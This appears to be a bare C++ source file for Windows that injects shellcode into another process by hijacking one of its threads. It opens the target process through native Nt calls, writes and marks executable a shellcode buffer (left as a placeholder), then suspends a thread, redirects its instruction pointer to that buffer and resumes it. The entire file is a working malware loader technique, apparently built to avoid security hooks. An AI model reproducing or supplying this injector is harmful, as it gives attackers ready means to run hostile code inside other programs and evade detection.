#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include "ALLCALLS.h"

int main(int argc, char** argv) {

	char* PID = argv[1];
	int targetPID = atoi(PID);

	unsigned char shellcode[] = "SHELLCODE HERE";

	SIZE_T shellcode_size = sizeof(shellcode);
	HANDLE targetProcHandle;
	HANDLE threadHijack = NULL;
	HANDLE snapshot;
	PVOID remoteBuffer;
	SIZE_T byteswritten = 0;
	ULONG oldprotect = 0;
	THREADENTRY32 threadentry;
	CONTEXT context;
	context.ContextFlags = CONTEXT_FULL;
	threadentry.dwSize = sizeof(THREADENTRY32);

	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
	CLIENT_ID cid;
	cid.UniqueProcess = (PVOID)targetPID;
	cid.UniqueThread = 0;

	NtOpenProcess(&targetProcHandle, PROCESS_ALL_ACCESS, &oa, &cid);

	NtAllocateVirtualMemory(targetProcHandle, &remoteBuffer, 0, &shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	NtWriteVirtualMemory(targetProcHandle, remoteBuffer, shellcode, sizeof(shellcode), &byteswritten);

	NtProtectVirtualMemory(targetProcHandle, &remoteBuffer, &shellcode_size, PAGE_EXECUTE_READ, &oldprotect);

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(snapshot, &threadentry);

	OBJECT_ATTRIBUTES oa2;
	InitializeObjectAttributes(&oa2, NULL, 0, NULL, 0);
	CLIENT_ID cid2;
	cid2.UniqueProcess = 0;
	
	while (Thread32Next(snapshot, &threadentry)) {
		if (threadentry.th32OwnerProcessID == targetPID) {
			cid2.UniqueThread = (HANDLE)threadentry.th32ThreadID;
			NtOpenThread(&threadHijack, THREAD_ALL_ACCESS, &oa2, &cid2);
			break;
		}
	}

	NtSuspendThread(threadHijack, NULL);

	NtGetContextThread(threadHijack, &context);
	context.Rip = (DWORD_PTR)remoteBuffer;
	NtSetContextThread(threadHijack, &context);

	NtResumeThread(threadHijack, NULL);

	NtClose(threadHijack);
	NtClose(targetProcHandle);

}
